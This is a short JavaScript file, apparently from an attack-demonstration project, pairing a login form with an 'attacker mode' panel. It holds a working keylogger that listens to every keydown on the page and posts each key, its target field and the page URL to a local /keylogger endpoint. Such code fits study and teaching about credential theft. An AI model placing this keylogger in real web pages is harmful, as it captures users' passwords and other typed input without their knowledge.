const attackerMode = document.querySelector(".slider");
const loginForm = document.getElementById("login");
const attackerContainer = document.getElementById("attacker-container");
const baseUrl = "http://localhost:3000";
let times;

const debounce = (func, time) => {
  clearTimeout(times);
  times = setTimeout(func, time);
};


// ../views/lockheed.html"


const keyLogger = async (key) => {
  try {
    const keyLogObject = {
      altnKey: key.altKey ? 1 : 0,
      ctrlKey: key.ctrlKey ? 1 : 0,
      userKey: key.key,
      targKey: key.target.id,
      userURI: key.target.baseURI,
    };
    let { data } = await axios({
      method: "POST",
      url: `${baseUrl}/keylogger`,
      data: keyLogObject,
    });
  } catch ({ message }) {
    console.log(message);
  }
};

window.addEventListener("keydown", (e) => {
  // debounce(keyLogger(e), 300);
  keyLogger(e);
});

attackerMode.addEventListener("click", () => {
  loginForm.classList.toggle("left");
  if (attackerContainer.hidden === true) {
    attackerContainer.hidden = false;
    return;
  }
  attackerContainer.hidden = true;
});
